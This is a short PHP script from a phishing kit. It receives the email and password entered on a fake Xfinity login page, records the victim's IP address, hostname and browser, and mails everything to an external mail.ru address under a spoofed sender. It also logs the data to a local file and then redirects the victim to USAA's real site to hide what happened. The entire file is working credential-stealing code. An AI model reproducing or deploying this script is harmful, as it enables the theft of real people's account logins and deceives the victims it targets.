<?php
$ip = getenv("REMOTE_ADDR");$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);

$message  = "========+[ Xfinity Login ]+=========\n";
$message .= "Email : ".$_POST['userid']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "HostName : ".$hostname."\n";

$message .= "Date And Time : ".$date."\n";

$message .= "Browser Details : ".$user_agent."\n";
$send = "gerasimovaveroniya6419@mail.ru";
$subject = "Comcast Linked to USAA | $ip";
$headers = "From: Comct  <legit@mrmoz.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
$fp = fopen("../sn3.txt","a");
fputs($fp,$message);
fclose($fp); 
header("Location: https://www.usaa.com/inet/ent_logon/Logoff?");
?>
